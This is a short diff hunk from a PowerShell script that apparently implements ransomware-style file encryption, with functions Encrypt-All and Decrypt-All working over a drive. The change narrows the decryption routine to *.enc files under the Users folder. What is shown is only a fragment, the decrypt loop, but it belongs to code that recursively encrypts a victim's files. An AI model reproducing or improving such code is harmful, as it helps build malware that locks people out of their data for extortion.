@@ -106,7 +106,7 @@ function Encrypt-All($key, $drive, $aesManaged, $encryptor){
 }
 
 function Decrypt-All($key){
-    $files=gci "$($drive.Name)" -Recurse -Include *.enc
+    $files=gci "$($drive.Name)\Users" -Recurse -Include *.enc
     Foreach ($file in $files){
          $content = Get-Content $file
          $decryptedcontent = Decrypt-String $key $content
